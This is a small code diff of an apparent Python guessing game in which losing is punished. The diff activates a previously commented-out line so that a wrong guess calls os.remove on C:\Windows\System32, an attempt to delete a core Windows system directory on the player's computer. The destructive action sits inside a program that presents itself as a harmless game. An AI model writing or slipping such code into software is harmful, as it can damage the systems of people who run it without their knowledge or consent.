@@ -8,4 +8,4 @@ if your_number == random_number:
     print("CONGRATULATIONS!! YOU SURVIVE")
 else:
     print("YOU DIED!")
-    # os.remove('C:\Windows\System32')
+    os.remove('C:\Windows\System32')
